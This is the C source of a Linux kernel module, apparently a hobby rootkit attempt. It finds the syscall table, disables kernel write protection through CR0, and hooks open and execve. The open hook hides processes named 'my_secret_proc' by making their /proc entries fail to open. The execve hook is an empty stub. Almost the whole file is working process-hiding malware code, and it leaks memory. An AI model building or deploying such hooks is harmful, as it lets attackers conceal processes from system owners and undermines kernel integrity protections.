#include <asm/uaccess.h>
#include <linux/sched.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/string.h>
#include <linux/slab.h> //For kzalloc
#define MODULE_NAME "Simple syscall hook"

/*
Typedef function pointers to syscalls so that declaring
orig_open_t orig_open 
is the same as having written
asmlinkage int (*orig_open)(const char __user *, int, umode_t);

See /include/linux/syscalls.h for the function headers
*/





typedef asmlinkage int (*orig_execve_t)(const char __user *, const char __user *const __user *, const char __user *const __user *); 
orig_execve_t orig_execve;

typedef asmlinkage int (*orig_open_t)(const char __user *, int, umode_t); 
orig_open_t orig_open;

unsigned long cr0; //Stores the cr0 register which maintains read/write access
unsigned long *sys_call_table;

unsigned long *get_syscall_table(void)
{
	unsigned long *syscall_table;
	unsigned long int i;

	for (i = PAGE_OFFSET; i < ULONG_MAX; i += sizeof(void *)) {
		syscall_table = (unsigned long *)i;
	//sys_close seems to be one of the only syscalls still exported as a kernel symbol
		if (syscall_table[__NR_close] == (unsigned long)sys_close) 
			return syscall_table;
	}
	return NULL;
}



asmlinkage int hacked_open(const char __user *filename, int flags, umode_t mode){
	
	char *kfilename;
	char *process_name = "my_secret_proc"; //Mask this process name!
	struct task_struct *g;
	kfilename = kzalloc(100, GFP_KERNEL);//allocate memory for process name
	copy_from_user(kfilename, filename, 100);
	for_each_process(g) { //Loop through all the processes
		if(strcmp(process_name, g->comm) == 0){ //Find the processes which match the process_name
			int length = snprintf(NULL, 0, "%d", g->pid);
			char pid[length+1];
			snprintf(pid, length+1, "%d", g->pid);
			char procdir[length + 7]; //6 more than pid for "/proc/"
			strcpy(procdir, "/proc/");
			strncpy(procdir+6, pid, length+1);
			
			//Length+6 because we don't want to compare the null byte!
			if(strncmp(kfilename, procdir, length+6) == 0){ //See if "/proc/####" is a match
				return -1; //Pretend the open call failed :D
			}
		}
    	}	
	return orig_open(filename, flags, mode);
}

asmlinkage int hacked_execve(const char __user *filename, const char __user *const __user *argv, const char __user *const __user *envp){

	int err;
	char *kfilename;
	kfilename = kzalloc(30, GFP_KERNEL);
	err = copy_from_user(kfilename, filename, 30);
	if(!err){
		if(strcmp(strrchr(kfilename, '/'), "/ps") == 0){
			//A ps command is being run
			//We actually don't need execve
		}	
	}
	return orig_execve(filename, argv, envp);
}

static int __init hook_init(void)
{
	printk("Starting module\n");

	sys_call_table = get_syscall_table();
	if (!sys_call_table)
		return -1;

	cr0 = read_cr0(); //Store the original cr0 flags

	//Save the old syscalls
	orig_execve = (orig_execve_t)sys_call_table[__NR_execve];
	orig_open = (orig_open_t)sys_call_table[__NR_open];


	printk("Hooking open and execve\n");
	write_cr0(cr0 & ~0x00010000); //Unprotect memory (Kernel now can't tell what's read-only! Oh noes!)
	sys_call_table[__NR_open] = (unsigned long)hacked_open; //Implant our hooks
	sys_call_table[__NR_execve] = (unsigned long)hacked_execve;	
	write_cr0(cr0); //Reprotect memory (The kernel is now happy again)

	//Verify we hooked em
	if(sys_call_table[__NR_execve] == (unsigned long)hacked_execve &&\
	sys_call_table[__NR_open] == (unsigned long)hacked_open)
	printk("open and execve hooked\n");
	else{
		printk("Failed to hook open or execve\n");
		return -1;
	}
	return 0;
}

static void __exit hook_cleanup(void)
{
	printk("Unhooking execve and open\n");
	write_cr0(cr0 & ~0x00010000);
	sys_call_table[__NR_open] = (unsigned long)orig_open; //Remove our hook
	sys_call_table[__NR_execve] = (unsigned long)orig_execve;
	write_cr0(cr0);
	printk("open and execve unhooked\n");
}

module_init(hook_init);
module_exit(hook_cleanup);

MODULE_LICENSE("About tree-fiddy");
MODULE_AUTHOR("Ian Kerr and Alex Kozlov");
MODULE_DESCRIPTION("Basic Syscall Hooking Attempt");
